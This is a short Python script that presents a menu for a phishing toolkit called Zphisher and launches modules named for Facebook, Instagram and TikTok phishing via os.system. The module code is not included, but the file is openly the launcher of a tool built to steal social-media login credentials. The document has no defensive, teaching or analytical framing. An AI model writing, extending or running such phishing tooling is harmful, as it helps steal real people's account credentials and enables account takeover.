# -*- coding: utf-8 -*-
import os

while True:
    print("""
    🧪 ZPHISHER MENU
    ------------------------
    1) Facebook Phishing
    2) Instagram Phishing
    3) TikTok Phishing
    4) Back
    """)
    choice = input("Zphisher ~# ")

    if choice == "1":
        os.system("python3 modules/zphisher/facebook.py")
    elif choice == "2":
        os.system("python3 modules/zphisher/instagram.py")
    elif choice == "3":
        os.system("python3 modules/zphisher/tiktok.py")
    elif choice == "4":
        break
    else:
        print("Invalid choice.")

